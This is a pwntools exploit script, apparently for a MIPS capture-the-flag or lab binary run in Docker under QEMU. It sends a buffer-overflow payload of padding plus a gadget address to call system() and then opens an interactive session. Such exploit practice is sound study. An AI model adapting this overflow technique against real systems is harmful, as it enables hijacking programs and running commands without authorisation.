from pwn import *


# initialize the binary
build = 'mips32r2-glibc'
binary = "mips32r2_static_o32"
elf = context.binary = ELF("../binaries/"+binary, checksec=False)
docker = ELF('/usr/bin/docker',checksec=False)

gs = """
set architecture mips:isa32r2
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','-p','1234:1234','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/'+binary])
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1",1234), gdbscript=gs, exe="../binaries/"+binary)
else:
    p = docker.process(['run','-i','--rm','-v','../binaries:/target/ctf','--name',binary,f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','/ctf/'+binary])


### EXPLOIT ###
p.recvline()                                    # id output

system_addr = int(p.readline().strip(),16)
print(f'system(): {hex(system_addr)}')          # we don't need the libc address for this technique
vuln_addr = int(p.readline().strip(),16)
print(f'vuln(): {hex(vuln_addr)}')

call_system_addr = 0x40095c

payload = flat(
    b'a'*0x24,                                  # padding
    p32(call_system_addr),                      # lw; move; jalr gadget to call system
)
p.sendline(payload)
p.interactive()
p.close()


### CLEANUP ###
print('[+] Removing docker container...')
subprocess.getoutput('docker stop ' + binary+' && docker rm ' + binary)